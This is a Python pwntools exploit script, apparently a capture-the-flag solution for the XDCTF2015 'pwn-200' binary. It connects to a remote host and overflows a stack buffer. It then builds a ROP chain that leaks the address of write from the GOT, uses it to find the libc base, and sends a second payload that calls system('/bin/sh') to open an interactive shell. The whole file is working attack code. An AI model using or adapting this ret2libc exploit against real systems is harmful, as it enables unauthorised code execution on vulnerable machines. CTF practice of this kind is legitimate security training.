from pwn import *
from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pwn-200"
# libc_binary = "./"

# p = process(argv=[binary])
p = remote("220.249.52.133", 40972)

elf = ELF(binary)
# libc = ELF(libc_binary)

write_plt = elf.sym["write"]
write_got = elf.got["write"]
main_plt = 0x80484be

context.arch = "i386"
payload = flat([
    "a"*(0x6c+4),write_plt,main_plt,1,write_got,4
])
# gdb.attach(p)
p.sendafter("Welcome to XDCTF2015~!\n",payload)
call_back = u32(p.recv(4))
log.success("write address ->" + hex(call_back))
libc = LibcSearcher("write",call_back)
libc_base = call_back - libc.dump("write")
log.success("libc address ->" + hex(libc_base))
system_addr = libc_base + libc.dump("system")
sh_addr = libc_base + libc.dump("str_bin_sh")

payload = flat([
    "a"*(0x6c+4),system_addr,0xdeadbeef,sh_addr
])
p.sendafter("Welcome to XDCTF2015~!\n",payload)

p.interactive()
